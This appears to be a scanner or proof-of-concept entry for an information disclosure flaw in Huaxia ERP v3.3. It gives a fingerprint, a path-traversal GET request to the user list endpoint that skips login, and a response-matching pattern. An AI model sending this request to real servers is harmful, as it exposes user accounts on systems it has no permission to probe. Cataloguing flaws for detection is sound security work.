# 华夏erpv3.3后台系统敏感信息泄露漏洞

华夏erpv3.3后台系统敏感 ｜ 信息泄露 ｜ —
- **指纹**：`body="华夏ERP"`
- **请求**：`GET /user/login/../../jshERP-boot/user/getAllList HTTP/1.1`
- **响应特征**：200 ^(?=.*?200)(?=.*?username).*?$